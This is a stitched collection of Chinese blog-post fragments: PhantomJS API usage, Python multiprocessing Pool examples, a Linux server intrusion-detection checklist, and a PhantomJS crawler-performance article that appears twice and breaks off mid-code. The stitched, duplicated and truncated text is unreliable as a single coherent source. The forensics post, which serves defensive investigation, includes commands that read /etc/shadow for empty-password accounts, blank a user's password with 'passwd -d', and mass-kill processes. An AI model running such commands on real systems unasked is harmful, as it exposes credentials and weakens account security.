});\n}\n```\n运行：\nphantomjs test.js hello\n结果：\n0 test.js\n1 hello\n功能：接受控制台输入参数。\n\n#### env（系统环境变量）\n\n代码（test.js）:\n```bash\nvar system = require('system');\nvar env = system.env;\n\nObject.keys(env).forEach(function(key) {\n  console.log(key + '=' + env[key]);\n});\n```\n运行：phantomjs test.js\n功能：列出系统环境变量\n\n#### os（平台类型）\n\n代码（test.js）：\n```bash\nvar system = require('system');\nvar os = system.os;\nconsole.log(os.architecture);  // '32bit'\nconsole.log(os.name);  // 'windows'\nconsole.log(os.version);  // '7'\n```\n运行：phantomjs test.js\n结果：\n32bit\nwindows\n7\n功能：输出运行平台类型\n\n#### pid （进程id）\n\n代码（test.js）:\n```bash\nvar system = require('system');\nvar pid = system.pid;\n\nconsole.log(pid);\n```\n输出进程pid\n\n#### platgform（平台信息）\n\n代码（test.js）:\n```bash\nvar system = require('system');\nconsole.log(system.platform); // 'phantomjs'\n```\n运行结果:phantomjs\n\n### Phantomjs-web server module\n描述：phantomjs web server module APi\n文档地址：[Phantomjs-web server module](http://phantomjs.org/api/webserver/method/listen.html)\n作用：作为webserver服务端，提供http服务。\n代码（test.js）：\n```bash\nvar webserver = require('webserver');\nvar server = webserver.create();\nvar service = server.listen(8080, function(request, response) {\n  response.statusCode = 200;\n  response.setHeader(\"Cookie\",\"1adaa2121\");\n  response.setEncoding(\"binary\");\n  response.write('<html><body>Hello!</body></html>');\n  console.log(request.method);\n  console.log(request.url);\n  console.log(request.httpVersion);\n  console.log(request.headers);\n  console.log(request.post);\n  console.log(request.postRaw);\n  response.close();\n});\n```\n运行：phantomjs test.js\n访问：http://localhost:8080\n\n如果要指定ip与端口，则8080可以这样写：'127.0.0.1:9999'。\n\n其中有2个参数，request与response。\n\nrequest参数方法：\n* request.method\n* request.url\n* request.httpVersion\n* request.headers\n* request.post\n* request.postRaw\n\n用来获取请求内容。\n\nresponse参数方法：\n* response.headers\n* response.setheader(name,value)\n* response.header(name)\n* response.statusCode()\n* response.setEncoding(\"binary\")\n* response.write(html_data)\n* response.writeHead(statusCode,headers)\n* reponse.close()\n* reponse.closeGracefully()\n\n### Phantomjs-web page module\n描述：phantomjs web page module APi\n文档地址：[Phantomjs-web page module](http://phantomjs.org/api/webpage/)\n作用：用来发送http请求，获取网络资源，或者页面操作。\n\n#### 实例化api类\n\n```bash\nvar webPage = require('webpage');\nvar page = webPage.create();\n```\n#### page方法\n* page.content  源码\n* page.title    标题\n* page.cookie    cookie\n* page.plainText  网页内容（去除html）\n* page.setting 参数设置\n* page.url 当前url\n\n#### clipRect剪切页面\n```bash\npage.clipRect = {\n    top: 14,\n    left: 3,\n    width: 400,\n    height: 300\n};\n```\n\n#### content获取网页源码\n```bash\nvar webPage = require('webpage');\nvar page = webPage.create();\n\npage.open('http://thief.one', function (status) {\n  var content = page.content;\n  console.log('Content: ' + content);\n  phantom.exit();\n});\n```\n#### cookie获取页面cookie\n```bash\npage.open('http://thief.one', function (status) {\n  var cookies = page.cookies;\n\n  console.log('Listing cookies:');\n  for(var i in cookies) {\n    console.log(cookies[i].name + '=' + cookies[i].value);\n  }\n\n  phantom.exit();\n});\n```\n#### 设置customHeaders内容：\n```bash\npage.customHeaders = {\n  \"X-Test\": \"foo\",\n  \"DNT\": \"1\"\n};\n```\n#### plainText获取网页内容（去除html只留内容）\n```bash\npage.open('http://thief.one', function (status) {\n  console.log('Stripped down page text:\\n' + page.plainText);\n  phantom.exit();\n});\n```\n#### setting 请求头设置\n```bash\nvar webPage = require('webpage');\nvar page = webPage.create();\npage.settings.userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36';\n```\n#### zoomFactor缩略图创建\n```bash\nvar webPage = require('webpage');\nvar page = webPage.create();\n\npage.zoomFactor = 0.25;\npage.render('capture.png');\n```\n#### addcookie添加cookie\n```bash\nphantom.addCookie({\n  'name'     : 'Valid-Cookie-Name',   /* required property */\n  'value'    : 'Valid-Cookie-Value',  /* required property */\n  'domain'   : 'localhost',\n  'path'     : '/foo',                /* required property */\n  'httponly' : true,\n  'secure'   : false,\n  'expires'  : (new Date()).getTime() + (1000 * 60 * 60)   /* <-- expires in 1 hour */\n});\n```\n#### 上传文件\n```bash\nvar webPage = require('webpage');\nvar page = webPage.create();\n\npage.uploadFile('input[name=image]', '/path/to/some/photo.jpg');\n```\n#### render页面截图\n```bash\npage.viewportSize = { width: 1920, height: 1080 };\npage.open(\"http://www.google.com\", function start(status) {\n  page.render('google_home.jpeg', {format: 'jpeg', quality: '100'});\n  phantom.exit();\n});\n```\n\n更多例子请参考：[examples](http://phantomjs.org/examples/index.html)\n\n###

初级用法（Pool）\n\n目的：存储子进程返回值\n\n说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。\n\n实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。\n\n```bash\n\nfrom multiprocessing import Pool\n\ndef test(p):     \n    return p\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    result=[]\n    for i  in xrange(50000):\n       '''\n       for循环执行流程：\n       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）\n       （2）执行子进程（同时执行10个）\n       '''\n       result.append(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    pool.join()\n\n    '''\n    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）\n    '''\n    for i in result:\n        print i.get()\n```\n\n错误写法：\n\n```bash\nfor i  in xrange(50000):\n   t=pool.apply_async(test, args=(i,)))\n   print t.get()\n```\n说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。\n\n\n#### 高级用法（Pool）\n\n目的：父进程实时获取子进程返回值，以此为标记结束所有进程。\n\n##### 实例（一）\n\n执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\n\nfrom multiprocessing import Pool\nimport Queue\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    q=Queue.Queue()\n    for i  in xrange(50000):\n    \t'''\n    \t将子进程对象存入队列中。\n    \t'''\n        q.put(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    '''\n    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。\n    '''\n    while 1:\n        if q.get().get():\n            pool.terminate() #结束进程池中的所有子进程。\n            break\n    pool.join()\n```\n\n说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。\n\n优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。\n\n不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。\n\n##### 实例（二）\n\n多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\nfrom multiprocessing import Pool\nimport Queue\nimport threading\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n\n    result=Queue.Queue() #队列\n    pool = Pool()\n\n    def pool_th():\n        for i  in xrange(50000000): ##这里需要创建执行的子进程非常多\n            try:\n                result.put(pool.apply_async(test, args=(i,)))\n            except:\n                break\n\n    def result_th():\n        while 1:\n            a=result.get().get() #获取子进程返回值\n            if a:\n                pool.terminate() #结束所有子进程\n                break\n    '''\n    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。\n    '''\n    t1=threading.Thread(target=pool_th)\n    t2=threading.Thread(target=result_th)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n    pool.join()\n```\n\n执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。\n\n优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。\n\n\n###

class=\"blockquote-center\">人是生而自由的，但却无往不在枷锁之中，自以为是其他一切主人的人，反而比其他一切更是奴隶</blockquote>\n　　最近遇到了很多服务器被入侵的例子，为了方便日后入侵检测以及排查取证，我查询了一些linux服务器入侵取证的相关资料，并在此总结分享，以便日后查询。\n　　一般服务器被入侵的迹象，包括但不局限于：由内向外发送大量数据包（DDOS肉鸡）、服务器资源被耗尽（挖矿程序）、不正常的端口连接（反向shell等）、服务器日志被恶意删除等。那么既然是入侵检测，首先要判断的是服务器是否被入侵，必须排除是管理员操作不当导致的问题，因此入侵检测的第一项工作就是询问管理员服务器的异常现象，这对之后入侵类型的判断非常重要。\n<!--more -->\n　　在询问了相关异常信息，排除了管理员操作失误等原因后，那么便可以开始正式的上服务器进行入侵检测以及取证操作了。\n\n### 补充内容\n*2017年4月21号*\n#### pidof\n查看正在运行的名为<filename>的进程\n```bash\npidof filename\n```\n#### fuser\n可以通过文件或者tcp udp协议看到进程\n```bash\nfuser -n tcp port\n```\n#### stat\n可以看文件修改时间，大小等信息\n```bash\nstat filename\n```\n\n#### lsmod\n看加载模块\n```bash\nlsmod\n```\n\n#### rpcinfo\n看rpc服务开放\n```bash\nrpcinfo -p\n```\n\n#### dmesg\n看网卡是否混杂模式(promiscuous mod)\n```bash\ndmesg|grep eth0\n```\n### 审计命令\n\n#### last\n　　这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。\n\n相关参数：\nlast -10（-n）   查看最近10条记录\nlast -x reboot   查看重启的记录\nlast -x shutdown 查看关机的记录\nlast -d          查看登陆的记录\nlast --help      命令帮助信息\nlast -f wtmp     用last命令查看wtmp文件（直接打开无法查看）\n\n#### lastb\n这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。\n\n相关参数：\nlastb name（root） 查看root用户登陆失败记录\nlastb -10（-n）    查看最近10条登陆失败记录\nlastb --heplp      命令帮助信息\n\n#### lastlog\n这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。\n\n相关参数：\nlastlog 所有用户上一次登陆记录\nlastlog -u username（root） root用户上一次登陆记录\nlastlog --help 命令帮助信息\n\n#### who\n　　这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。\n\n#### history\n查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。\n\n相关参数：\nhistory 查看所有历史记录\nhistory -10 查看最近10条记录\nhistory | grep \"wget\"  查看wget相关信息的记录\nhistory --help         命令帮助信息\n\nhistory显示时间戳：\n```bash\nexport HISTTIMEFORMAT=\"%F %T `whoami` \"\nhistory | more\n```\n\n### 检查用户\nLinux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。\n```bash\nless /etc/passwd　　查看是否有新增用户\ngrep :0 /etc/passwd　　查看是否有特权用户（root权限用户）\nls -l /etc/passwd　　查看passwd最后修改时间\nawk -F: '$3==0 {print $1}' /etc/passwd　　查看是否存在特权用户\nawk -F: 'length($2)==0 {print $1}' /etc/shadow　　查看是否存在空口令用户\n```\n注：linux设置空口令：passwd -d username\n\n### 检查进程\n　　一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。\n#### 普通进程\n```bash\nps -aux　　查看进程\ntop        查看进程\nlsof -p pid　　查看进程所打开的端口及文件\nlsof -c 进程名　　查看关联文件\nps -aux | grep python | cut -d ' ' -f 2 | xargs kill   杀死python相关的进程\n检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v \"^#\"，输出的信息就是你这台机器所开启的远程服务。\n```\n如果进程中没有发现异常，那么可以看看有没有开启某些隐藏进程。\n#### 隐藏进程\n```bash\nps -ef | awk '{print}' | sort -n | uniq >1\nls /proc | sort -n |uniq >2\ndiff 1 2\n```\n注：以上3个步骤为检查隐藏进程。\n\n### 检查文件\n被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。\n```bash\nfind / -uid 0 -print　　查找特权用户文件\nfind / -size +10000k -print　　查找大于10000k的文件\nfind / -name \"…\" -prin　　查找用户名为…的文件\nfind / -name core -exec ls -l {} \\;　　查找core文件，并列出详细信息\nmd5sum -b filename　　查看文件的md5值\nrpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）\nwhereis 文件名　　查看文件路径\nls -al 文件名　　查看文件创建时间\ndu -sh  文件名   查看文件大小\n```\n### 检查网络\n检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。\n```bash\nip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有sniffer\nlsof -i\nnetstat -nap　　查看不正常端口\narp -a　　查看arp记录是否正常\nifconfig -a　　查看网卡设置\n```\n\n### 检查计划任务\n当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。\n```bash\ncrontab -u root -l　　查看root用户的计划任务\ncat /etc/crontab\nls -l /etc/cron.*　　查看cron文件是否变化的详细信息\nls /var/spool/cron/\n```\n\n### 检查系统后门\n可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。\n```bash\nvim $HOME/.ssh/authorized_keys　　查看ssh永久链接文件\nlsmod　　检查内核模块\nchkconfig –list/systemctl list-units –type=service　　检查自启\n```\n查看著名的木门后门程序：\n```bash\nls /etc/rc.d   #系统开机后，此目录下的文件会被启动\nls /etc/rc3.d  \nfind / -name “.rhosts” –print\nfind / -name “.forward” –print\n```\n\n### 检查网站后门\n　　如果服务器上运行着web程序，那么需要检查是否通过web漏洞入侵服务器，具体的判断方法可以结合分析中间件日志以及系统日志，但过程需要较长时间。我们也可以通过检查服务器上是否留有入侵者放置的网站后门木马，以此判断黑客是否通过web应用入侵到服务器。\n\n#### Method One\n* 将网站目录下，文件名中含有jsp、php、asp、aspx的文件（注意是含有）都copy出来并压缩。\n* 通过windows下的[D盾](http://www.d99net.net/)工具扫描打包出来的目录，扫描是否存Webshell（网站后门）\n\n#### Method Two\n　　直接使用[MaskFindShell](https://github.com/tengzhangchao/MaskFindShell)工具，进行webshell扫描（目前只能扫描jsp与php的网站，并且php的误报比较高）\n关于MaskFindShell详细用法，可以参考：[MaskFindShell-Document](https://github.com/tengzhangchao/MaskFindShell/blob/master/README.md)\n\n#### 寻找服务器物理路径\n无论哪种方法的webshell查找，首先要确定的是web服务器安装的路径，因为webshell都是放在web路径下的。\n\n* 询问管理员、网站开发商\n* [SearchWebPath](https://github.com/tengzhangchao/SearchWebPath)，具体用法参考：[SearchWebPath用法](http://thief.one/2017/03/10/SearchWebPath/)\n\n\n### 打包文件\n　　当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？\n\n#### 打包web文件\n打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：\n```bash\ntar cvf my_txt_files.tar `find . -type f -name \"*.jsp*\"`\n```\n#### 打包日志文件\n```bash\ntar -cvf log.tar /var/log\n```\n#### 打包其他信息\n```bash\nlast > last.log\nnetstat -an > netstat.log\n......\n```\n### 传输文件到本地\n将服务器上的文件传输到本地电脑上的几种方法。\n#### lrzsz\n如果ssh连接的客户端为xshell等，可以安装lrzsz命令（putty无法使用）\n```bash\napt-get install lrzsz\n```\n使用：\n上传文件到linux，rz；下载linux文件，sz 文件名。\n\n#### 开启ftp或者http\n　　开ftp这里我不介绍了，网上很多教程，这里主要说说开启http服务。\n　　一般linux服务器都默认安装了python，那么可以借助python快速开启一个http服务，详细参考：[基于Python的WebServer](http://thief.one/2016/09/14/%E5%9F%BA%E4%BA%8EPython%E7%9A%84WebServer/)\n\n#### U盘挂载\n如果我们不是通过ssh的方式连接，而是直接通过显示器连接上服务器进行操作，那么可以尝试U盘传输。\n```bash\nfdisk -l 查看U盘路径\nmonut /dev/sdb4 /mnt  挂载U盘\ncd /mnt 进入U盘\numount /mnt  退出U盘\n```\n\n本文总结的都是一些Linux入侵检测最基础的命令，至于怎么用好这些命令，需要结合实际情况，主要还是看经验。以上所诉，还只是入侵检测信息收集阶段，至于如何通过现有信息分析出入侵途径，还需要借助其他工具以及知识。\n\n\n参考链接：http://www.jb51.net/hack/421908.html\n\n转载请说明出处:\n[Linux服务器入侵检测基础 |

class=\"blockquote-center\">人生之路需要坚持，技术之道亦然</blockquote>\n写过爬虫的朋友应该都用过一个无头浏览器--phantomjs，使用它的原因很简单明了：能够高度模拟浏览器访问（对抗反爬虫），无头浏览（可以节省性能）。Phantomjs应用最广泛的应该还是用来执行js代码，比如写一个js脚本，利用phantomjs去执行，可以写一个页面截图、网页性能测试等等功能的。\n<!--more -->\n　　phantomjs也是爬虫界的一大神器，我最初使用它就是用来爬取一些动态加载的网页，效果俱佳。当然Phantomjs也不是完美无缺的，虽然作为无头浏览器其性能已经比其他基于浏览器内核的工具快多了，但跟普通的爬虫相比，速度仍是相差甚远。\n　　关于phantomjs的安装使用网上一大推，这里也不在重复介绍，本篇文章重点在于介绍Phantomjs性能优化问题。因为我比较熟悉python语言，因此就借助此语言谈谈Phantomjs的性能优化功法。\n\n### 基础篇（设置参数功法）\n　　Python中使用Phantomjs需要借助Selenium模块，Selenium本身也是用来做Web自动化测试的，正好封装了Phantomjs，因此我们可以借助它来使用Phantomjs。具体安装方法，这里不再介绍，Phantomjs在启动时可以设置参数，那么来看看如何通过设置参数，达到优化性能的目的。\n\n#### 代码测试\n访问单个网站的速度\n\n默认配置：\n```bash\nfrom selenium import webdriver\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=[])\nd.get(\"http://thief.one\")\nd.quit()\n```\n测试结果：3.2s\n\n修改配置：\n```bash\nfrom selenium import webdriver\n\nservice_args=[]\nservice_args.append('--load-images=no')  ##关闭图片加载\nservice_args.append('--disk-cache=yes')  ##开启缓存\nservice_args.append('--ignore-ssl-errors=true') ##忽略https错误\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\nd.get(\"http://thief.one\")\nd.quit()\n```\n测试结果：2.9s\n\n说明：从单个网站来看，合理设置参数可以提速0.3s（如果网站上图片等资源较多，则提升的效果会更明显）。\n\n#### 设置超时\n　　当利用爬虫访问一批网站时，遇到加载慢的网站往往会阻塞很久，遇到打不开的网站则会一直阻塞，严重影响了爬虫的性能，我们知道一般的爬虫，例如requests、urllib等模块可以设置timeout，也就是超时时间，phantomjs同样可以设置。\n```bash\nfrom selenium import webdriver\n\nservice_args=[]\nservice_args.append('--load-images=no')\nservice_args.append('--disk-cache=yes')\nservice_args.append('--ignore-ssl-errors=true')\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\nd.implicitly_wait(10)        ##设置超时时间\nd.set_page_load_timeout(10)  ##设置超时时间\nd.get(\"http://www.baidu.com\")\nd.quit()\n```\n　　说明：如果phantomjs加载时间超过10s，则会触发异常。（虽然触发异常，但current_url仍然可以用来获取当前url，源码也可以获取，只不过是没有加载完全的源码。当然只针对加载慢的网站，完全无法访问的网站除外。）\n\n### 中级篇（合理开关）\n　　在我使用phantomjs的一段时间内，通过不断调试，我发现phantomjs主要的性能消耗在于phantomjs进程的开启上。因为在python中使用phantomjs，相当于开启并调用phantomjs.exe（windows）执行一些操作，因此如果频繁的开启关闭phantomjs进程，则会非常消耗性能，因此要合理操作开关。\n\n#### 代码测试\n单线程访问百度10次：\n\n优化前：\n```bash\nfrom selenium import webdriver\n\ndef phantomjs_req(url):\n\tservice_args=[]\n\tservice_args.append('--load-images=no')\n\tservice_args.append('--disk-cache=yes')\n\tservice_args.append('--ignore-ssl-errors=true')\n\n\td=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\n\td.get(url)\n\tprint d.current_url\n\n\td.quit()\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor i in url_list:\n\tphantomjs_req(i)\n\n```\n测试结果：28.2s，运行过程中,phantomjs进程不断开关。\n\n优化后：\n```bash\nfrom selenium import webdriver\n\ndef phantomjs_req(url):\n\td.get(url)\n\tprint d.current_url\n\nservice_args=[]\nservice_args.append('--load-images=no')\nservice_args.append('--disk-cache=yes')\nservice_args.append('--ignore-ssl-errors=true')\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor i in url_list:\n\tphantomjs_req(i)\n\nd.quit()\n```\n测试结果：4.2s\n\n　　说明：可以看到优化前与优化后代码的区别，在于将phantomjs开启关闭的操作放到了循环外面，使它始终只开关一次。可以看到性能的差别非常大，因此也可以看出phantomjs开关过程非常消耗时间。\n\n*注意：此方法虽然节省了很大的开支，但会引起另外一个phantomjs的Bug（暂且称之为Bug），也就是phantomjs状态覆盖问题。当批量去访问一些网站时，会发现返回的结果与请求的网站不对应。关于此问题，请移步[Phantomjs爬过的那些坑](http://thief.one/2017/03/01/Phantomjs%E7%88%AC%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/)。*\n\n### 高级篇（phantomjs并发问题）\n　　通过前面的优化，我们发现phantomjs的性能提高了很多，但即便如此，以上代码也只是实现了单线程中的优化。当遇到大批量的网站时，并发是必须的选择，那么Phantomjs在并发中又改如何使用与优化呢？\n\n#### 优化之路\n在优化phantomjs并发性能的问题上，我也并没有一帆风顺，期间查阅了很多资料，也踩过了很多的坑。\n\n##### 不成熟的优化（一）\n起初我用了最直接了当的方法，企图开启phantomjs并发的性能。（运行一个phantomjs进程，进程内开启多线程）\n```bash\nd=webdriver.PhantomJS()   \ndef test(url):\n     d.get(url)\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor url in url_list:\n     threading.Thread(target=test,args=(url,)).start() \nd.quit()\n```\n　　然而运行连连出错，在查看了官网等资料后发现phantomjs是单线程的，因此如果按照上面的写法，那么不能使用多线程同时去执行，此次优化失败！\n\n#### 不成熟的优化（二）\n既然一个phantomjs只能支持单线程，那么我就开启多个phantomjs。\n```bash\ndef test(url):\n     d=webdriver.PhantomJS()\n     d.get(url)\n     d.quit()\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor url in url_list:\n    threading.Thread(target=test,args=(url,)).start()\n```\n　　终于我看到同时10个phantomjs进程被开启了，10个网站的请求可以并发执行了。然而当网站的数量为50个时，要同时运行50个phantomjs进程？No，这必定会搞垮服务器，此次优化失败！\n\n#### 不成熟的优化（三）\n　　经过以上2次失败，我开始思考，如何只开启10个phantomjs进程，然后每个phantomjs进程按顺序执行请求网站的操作呢?这样就相当于10个进程并发执行了。\n终于在某个夜晚，我想出了以下代码：\n```bash\ndef  test():\n     d=webdriver.PhantomJS()\n     for i in url_list:\n        d.get(url)\n     d.quit()\n\nurl_list=[\"http://www.baidu.com\"]*50\nfor i in range(10):\n     threading.Thread(target=test).start()\n```\n　　成功开启了10个phantomjs进程，每个进程按顺序执行了50个网站的请求。等等，貌似这样设计，每个phantomjs进程都会去访问50次百度，这不是最初的要求，oh，No！\n\n#### 不算成熟但还可以的优化\n　　在第三阶段并发优化的雏形已经出来了，只不过还需要解决一个多线程共享资源的问题，这个可以用Queue模块解决。那么直接看优化后并发的代码：\n```bash\n__author__=\"nMask\"\n__Date__=\"20170224\"\n__Blog__=\"http://thief.one\"\n\nimport Queue\nfrom selenium

class=\"blockquote-center\">人生之路需要坚持，技术之道亦然</blockquote>\n写过爬虫的朋友应该都用过一个无头浏览器--phantomjs，使用它的原因很简单明了：能够高度模拟浏览器访问（对抗反爬虫），无头浏览（可以节省性能）。Phantomjs应用最广泛的应该还是用来执行js代码，比如写一个js脚本，利用phantomjs去执行，可以写一个页面截图、网页性能测试等等功能的。\n<!--more -->\n　　phantomjs也是爬虫界的一大神器，我最初使用它就是用来爬取一些动态加载的网页，效果俱佳。当然Phantomjs也不是完美无缺的，虽然作为无头浏览器其性能已经比其他基于浏览器内核的工具快多了，但跟普通的爬虫相比，速度仍是相差甚远。\n　　关于phantomjs的安装使用网上一大推，这里也不在重复介绍，本篇文章重点在于介绍Phantomjs性能优化问题。因为我比较熟悉python语言，因此就借助此语言谈谈Phantomjs的性能优化功法。\n\n### 基础篇（设置参数功法）\n　　Python中使用Phantomjs需要借助Selenium模块，Selenium本身也是用来做Web自动化测试的，正好封装了Phantomjs，因此我们可以借助它来使用Phantomjs。具体安装方法，这里不再介绍，Phantomjs在启动时可以设置参数，那么来看看如何通过设置参数，达到优化性能的目的。\n\n#### 代码测试\n访问单个网站的速度\n\n默认配置：\n```bash\nfrom selenium import webdriver\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=[])\nd.get(\"http://thief.one\")\nd.quit()\n```\n测试结果：3.2s\n\n修改配置：\n```bash\nfrom selenium import webdriver\n\nservice_args=[]\nservice_args.append('--load-images=no')  ##关闭图片加载\nservice_args.append('--disk-cache=yes')  ##开启缓存\nservice_args.append('--ignore-ssl-errors=true') ##忽略https错误\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\nd.get(\"http://thief.one\")\nd.quit()\n```\n测试结果：2.9s\n\n说明：从单个网站来看，合理设置参数可以提速0.3s（如果网站上图片等资源较多，则提升的效果会更明显）。\n\n#### 设置超时\n　　当利用爬虫访问一批网站时，遇到加载慢的网站往往会阻塞很久，遇到打不开的网站则会一直阻塞，严重影响了爬虫的性能，我们知道一般的爬虫，例如requests、urllib等模块可以设置timeout，也就是超时时间，phantomjs同样可以设置。\n```bash\nfrom selenium import webdriver\n\nservice_args=[]\nservice_args.append('--load-images=no')\nservice_args.append('--disk-cache=yes')\nservice_args.append('--ignore-ssl-errors=true')\n\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\nd.implicitly_wait(10)        ##设置超时时间\nd.set_page_load_timeout(10)  ##设置超时时间\nd.get(\"http://www.baidu.com\")\nd.quit()\n```\n　　说明：如果phantomjs加载时间超过10s，则会触发异常。（虽然触发异常，但current_url仍然可以用来获取当前url，源码也可以获取，只不过是没有加载完全的源码。当然只针对加载慢的网站，完全无法访问的网站除外。）\n\n### 中级篇（合理开关）\n　　在我使用phantomjs的一段时间内，通过不断调试，我发现phantomjs主要的性能消耗在于phantomjs进程的开启上。因为在python中使用phantomjs，相当于开启并调用phantomjs.exe（windows）执行一些操作，因此如果频繁的开启关闭phantomjs进程，则会非常消耗性能，因此要合理操作开关。\n\n#### 代码测试\n单线程访问百度10次：\n\n优化前：\n```bash\nfrom selenium import webdriver\n\ndef phantomjs_req(url):\n\tservice_args=[]\n\tservice_args.append('--load-images=no')\n\tservice_args.append('--disk-cache=yes')\n\tservice_args.append('--ignore-ssl-errors=true')\n\n\td=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\n\td.get(url)\n\tprint d.current_url\n\n\td.quit()\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor i in url_list:\n\tphantomjs_req(i)\n\n```\n测试结果：28.2s，运行过程中,phantomjs进程不断开关。\n\n优化后：\n```bash\nfrom selenium import webdriver\n\ndef phantomjs_req(url):\n\td.get(url)\n\tprint d.current_url\n\nservice_args=[]\nservice_args.append('--load-images=no')\nservice_args.append('--disk-cache=yes')\nservice_args.append('--ignore-ssl-errors=true')\nd=webdriver.PhantomJS(\"D:\\python27\\Scripts\\phantomjs.exe\",service_args=service_args)\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor i in url_list:\n\tphantomjs_req(i)\n\nd.quit()\n```\n测试结果：4.2s\n\n　　说明：可以看到优化前与优化后代码的区别，在于将phantomjs开启关闭的操作放到了循环外面，使它始终只开关一次。可以看到性能的差别非常大，因此也可以看出phantomjs开关过程非常消耗时间。\n\n*注意：此方法虽然节省了很大的开支，但会引起另外一个phantomjs的Bug（暂且称之为Bug），也就是phantomjs状态覆盖问题。当批量去访问一些网站时，会发现返回的结果与请求的网站不对应。关于此问题，请移步[Phantomjs爬过的那些坑](http://thief.one/2017/03/01/Phantomjs%E7%88%AC%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/)。*\n\n### 高级篇（phantomjs并发问题）\n　　通过前面的优化，我们发现phantomjs的性能提高了很多，但即便如此，以上代码也只是实现了单线程中的优化。当遇到大批量的网站时，并发是必须的选择，那么Phantomjs在并发中又改如何使用与优化呢？\n\n#### 优化之路\n在优化phantomjs并发性能的问题上，我也并没有一帆风顺，期间查阅了很多资料，也踩过了很多的坑。\n\n##### 不成熟的优化（一）\n起初我用了最直接了当的方法，企图开启phantomjs并发的性能。（运行一个phantomjs进程，进程内开启多线程）\n```bash\nd=webdriver.PhantomJS()   \ndef test(url):\n     d.get(url)\n\nurl_list=[\"http://www.baidu.com\"]*10\nfor url in 